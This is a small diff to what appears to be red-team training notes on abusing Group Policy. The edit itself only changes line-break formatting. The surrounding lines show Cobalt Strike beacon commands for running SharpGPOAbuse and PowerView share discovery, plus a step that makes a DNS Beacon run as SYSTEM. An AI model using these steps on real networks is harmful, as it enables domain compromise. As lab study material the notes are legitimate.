@@ -127,8 +127,7 @@ beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpG
 
 {% hint style="info" %}
 Note that you can find this <mark style="color:yellow;">`software`</mark> share using PowerView:\
-\
-
+<br>
 
 ```
 beacon> powershell Find-DomainShare -CheckShareAccess
@@ -146,8 +145,7 @@ Now, log into the console of _**Workstation 1**_&#x61;nd run `gpupdate /force` f
 
 <mark style="color:green;">Upon rebooting the machine, once it starts up, the DNS Beacon will execute as SYSTEM</mark>.
 
-\
-
+<br>
 
 ![](https://files.cdn.thinkific.com/file_uploads/584845/images/afd/f74/129/beacons.png)
 
